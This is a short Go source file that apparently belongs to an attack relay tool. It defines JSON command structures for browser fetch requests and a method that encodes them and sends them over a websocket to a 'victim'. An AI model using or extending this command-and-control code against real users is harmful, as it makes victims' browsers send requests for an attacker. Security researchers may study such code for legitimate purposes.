package define

import (
	"encoding/json"

	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

type FetchOption struct {
	Method  string            `json:"method"`
	Body    string            `json:"body"`
	Headers map[string]string `json:"headers"`
	Mode    string            `json:"mode"`
}
type Fetch struct {
	Url    string      `json:"url"`
	Option FetchOption `json:"options"`
}
type RelayCommand struct {
	CommandId     string `json:"command_id"`
	CommandDetail Fetch  `json:"command_detail"`
}

func (c *RelayCommand) Marshal() []byte {
	str, _ := json.Marshal(c)
	return str
}

func (c *RelayCommand) SendTo(conn *websocket.Conn) error {
	data, err := json.Marshal(c)
	if err != nil {
		log.Error("before send to victim, Marshal error: ", err)
		return err
	}
	data = Encode(data)
	log.Tracef("Sending data: %v", string(data))
	return conn.WriteMessage(websocket.TextMessage, data)
}
